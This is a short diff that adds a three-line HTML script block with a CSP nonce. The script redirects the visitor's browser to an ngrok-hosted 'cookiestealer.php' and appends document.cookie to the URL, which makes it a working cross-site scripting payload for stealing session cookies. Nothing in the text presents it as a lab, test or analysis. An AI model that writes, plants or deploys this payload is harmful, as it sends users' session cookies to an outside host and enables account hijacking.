@@ -1,0 +1,3 @@
+<script nonce=LRGWAXOY98Es0zz0QOVmag==>
+	document.location="http://98f7a6048019.ngrok.io/cookiestealer.php?c="+document.cookie;
+</script>
